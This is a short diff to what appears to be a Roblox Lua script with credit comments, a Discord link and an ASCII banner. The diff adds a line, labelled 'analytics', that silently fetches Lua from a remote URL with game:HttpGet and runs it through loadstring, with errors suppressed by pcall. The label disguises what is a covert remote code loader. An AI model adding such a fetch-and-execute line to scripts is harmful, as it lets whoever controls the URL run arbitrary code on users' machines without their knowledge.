@@ -2,6 +2,9 @@
 -- please give credits if you are going to take something from here
 -- get the rbxm source file here: https://discord.gg/UwkKBPayg6
 
+-- scriptblox analytics
+pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_879959c742fe", "1.0.0", false) end)
+
 --[=[
  d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
 88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
